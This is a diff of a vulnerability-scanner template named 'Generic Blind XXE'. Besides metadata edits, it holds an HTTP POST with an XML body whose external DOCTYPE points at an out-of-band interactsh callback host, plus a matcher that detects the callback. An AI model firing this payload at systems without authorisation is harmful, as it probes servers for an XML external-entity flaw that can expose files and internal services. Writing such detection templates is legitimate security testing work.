@@ -1,17 +1,23 @@
 id: generic-blind-xxe
-
 info:
   name: Generic Blind XXE
   author: geeknik
   severity: high
   description: This template detects Generic Blind XXE.
+  classification:
+    cwe-id:
+      - CWE-611
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
-  tags: xxe,generic,blind,vuln
-
+  tags: blind,generic,vuln,xxe
 http:
-  - raw:
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - http
+    raw:
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -21,10 +27,3 @@ http:
         <?xml version="1.0"?>
         <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
         <foo>&e1;</foo>
-
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
-
